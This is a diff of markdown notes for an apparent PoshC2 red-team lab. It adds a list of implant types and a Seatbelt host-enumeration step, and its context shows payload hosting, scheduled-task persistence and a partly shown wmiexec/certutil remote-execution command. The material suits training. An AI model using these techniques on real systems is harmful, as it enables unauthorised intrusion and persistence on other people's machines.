@@ -60,6 +60,12 @@ For more on `Poshc2` github like [here](https://apple.stackexchange.com/question
 
 # Host Payloads 
 
+The PoshC2 Implant Types can be summarized as:
+* PS - PowerShell Implant.
+* C# - C# Implant that does not use System.Management.Automation.dll.
+* PY - Python Implant.
+* PB - PBind
+
 In the ImplantHandler run file upload command 
 ```
 add-hosted-file
@@ -149,7 +155,7 @@ Register-ScheduledTask -Action $action -Trigger $trigger -Taskname $taskname -De
 ```
 > Learn more about powershell `New-ScheduledTaskTrigger` [here](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/new-scheduledtask?view=windowsserver2022-ps)
 
-Save your pslo scropt as bad.ps1 in /home/parrot/desktop/bad.ps1
+Save your pslo script as bad.ps1 in /home/parrot/desktop/bad.ps1
 
 Lets run the .ps1
 ```
@@ -192,6 +198,12 @@ wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -url
 
 In ImplantHandler interact with the new payload 
 
+Lets run a built in host enumeration script 
+```
+seatbelt
+```
+Take some time to look at the differnet feilds, look into any that you dont recognize.
+
 In the new payload handler lets navigate to the `documents` folder 
 ```
 cd C:\users\username\documents
@@ -214,5 +226,5 @@ Things to lookup and learn:
 - [ ] Windows 10 privilege escalation 
 - [ ]   
 
-
-
+# Resources 
+[PoshC2 Documentation](https://poshc2.readthedocs.io/_/downloads/en/latest/pdf/)
